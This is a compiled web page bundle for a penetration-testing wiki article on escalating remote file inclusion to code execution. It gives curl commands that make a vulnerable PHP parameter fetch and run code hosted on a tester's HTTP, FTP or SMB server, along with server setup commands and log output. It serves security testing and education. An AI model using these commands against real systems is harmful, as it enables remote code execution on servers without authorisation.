import{_ as a,c as i,a5 as e,o as t}from"./chunks/framework.B5CpDqM0.js";const c=JSON.parse('{"title":"RFI to RCE","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"web/inputs/file-inclusion/rfi-to-rce.md","filePath":"web/inputs/file-inclusion/rfi-to-rce.md","lastUpdated":1724982529000}'),n={name:"web/inputs/file-inclusion/rfi-to-rce.md"};function p(h,s,l,r,o,k){return t(),i("div",null,s[0]||(s[0]=[e(`<h1 id="rfi-to-rce" tabindex="-1">RFI to RCE <a class="header-anchor" href="#rfi-to-rce" aria-label="Permalink to &quot;RFI to RCE&quot;">​</a></h1><h2 id="via-http" tabindex="-1">via HTTP <a class="header-anchor" href="#via-http" aria-label="Permalink to &quot;via HTTP&quot;">​</a></h2><p>The tester can host an arbitrary PHP code and access it through the HTTP protocol</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Create phpinfo.php</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;&lt;?php phpinfo(); ?&gt;&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> phpinfo.php</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Start a web server</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http.server</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 80</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Exploit the RFI to fetch the remote phpinfo.php file</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;$URL/?parameter=http://tester.server/phpinfo.php&#39;</span></span></code></pre></div><h2 id="via-ftp" tabindex="-1">via FTP <a class="header-anchor" href="#via-ftp" aria-label="Permalink to &quot;via FTP&quot;">​</a></h2><p>The tester can also host his arbitrary PHP code and access it through the FTP protocol. He can use the python library pyftpdlib to start a FTP server.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Start FTP server</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> python3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> pyftpdlib</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 21</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">                                                                                                                                            1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ↵</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> alex@ubuntu</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[I 2022-07-11 00:04:26] concurrency model: async</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[I 2022-07-11 00:04:26] masquerade (</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">NAT</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) address: None</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[I 2022-07-11 00:04:26] passive ports: None</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[I 2022-07-11 00:04:26] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">176948</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &lt;&lt;&lt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">#</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Exploit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> the</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> RFI</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> to</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> fetch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> the</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> remote</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> phpinfo.php</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> file</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;$URL/?parameter=ftp://tester.server/phpinfo.php&#39;</span></span></code></pre></div><div class="tip custom-block"><p>PHP uses the anonymous credentials to authenticate to the FTP server. If the tester needs to use custom credentials, he can authenticate as follows :</p><p><code>curl &#39;$URL/?parameter=ftp://user:pass@tester.server/phpinfo.php&#39;</code></p></div><h2 id="via-smb" tabindex="-1">via SMB <a class="header-anchor" href="#via-smb" aria-label="Permalink to &quot;via SMB&quot;">​</a></h2><p>Sometimes, the vulnerable web application is hosted on a Windows Server, meaning the attacker could log into a SMB Server to store the arbitrary PHP code.</p><p><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noreferrer">Impacket</a>&#39;s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py" target="_blank" rel="noreferrer">smbserver.py</a> (Python) script can be used on the attacker-controlled machine to create a SMB Server.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sudo python3 smbserver.py -smb2support share $(pwd) 130 ↵ alex@ubuntu</span></span>
<span class="line"><span>Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[*] Config file parsed</span></span>
<span class="line"><span>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span></span>
<span class="line"><span>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span></span>
<span class="line"><span>[*] Config file parsed</span></span>
<span class="line"><span>[*] Config file parsed</span></span>
<span class="line"><span>[*] Config file parsed</span></span></code></pre></div><p>The PHP script can then be included by using a <a href="https://en.wikipedia.org/wiki/Universal_Naming_Convention" target="_blank" rel="noreferrer">UNC</a> Path.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;$URL/?parameter=\\\\tester.server\\phpinfo.php&#39;</span></span></code></pre></div>`,14)]))}const F=a(n,[["render",p]]);export{c as __pageData,F as default};
